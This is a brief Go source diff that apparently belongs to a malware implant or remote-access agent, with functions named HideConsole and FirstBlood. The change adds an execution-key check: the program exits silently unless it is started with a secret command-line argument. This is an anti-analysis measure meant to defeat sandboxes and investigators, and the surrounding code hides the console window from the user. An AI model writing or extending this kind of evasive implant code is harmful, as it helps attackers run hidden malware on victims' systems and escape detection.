@@ -14,6 +14,15 @@ import (
 )
 
 func main() {
+	if config.ExecuteKey != "" {
+		if len(os.Args) != 2 {
+			os.Exit(0)
+		}
+		if os.Args[1] != config.ExecuteKey {
+			os.Exit(0)
+		}
+	}
+
 	if config.HideConsole {
 		dataConsole, errConsole := packet.HideConsole()
 		if errConsole != nil {
@@ -22,6 +31,7 @@ func main() {
 			fmt.Println(string(dataConsole))
 		}
 	}
+
 	ok := packet.FirstBlood()
 	if ok {
 		var Token uintptr
